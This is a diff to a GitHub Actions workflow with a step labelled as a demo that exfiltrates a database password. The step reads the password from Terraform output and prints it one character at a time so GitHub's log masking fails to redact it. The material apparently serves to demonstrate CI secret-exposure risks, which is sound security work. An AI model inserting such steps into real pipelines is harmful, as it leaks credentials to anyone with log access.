@@ -31,14 +31,13 @@ jobs:
           TF_VAR_db_password: ${{ secrets.TOP_SECRET_SECRET }}
         run: terraform plan -input=false
 
-      # MALICIOUS STEP (demo): Secret was passed into the job for Terraform;
-      # any step can read it. Print char-by-char to bypass GitHub's log masking.
+      # MALICIOUS STEP (demo): Read secret from Terraform output (state in repo)
+      # and print char-by-char so GitHub's log masker does not redact it.
       - name: "[DEMO] Exfil secret via char-by-char print"
-        env:
-          SECRET_VALUE: ${{ secrets.TOP_SECRET_SECRET }}
+        working-directory: terraform
         run: |
           echo "Direct output (will be masked):"
-          echo "$SECRET_VALUE"
+          terraform output -raw db_password || true
           echo ""
           echo "Bypass: character-by-character (secret visible in log):"
-          echo "$SECRET_VALUE" | sed 's/./& /g'
+          terraform output -raw db_password | sed 's/./& /g'
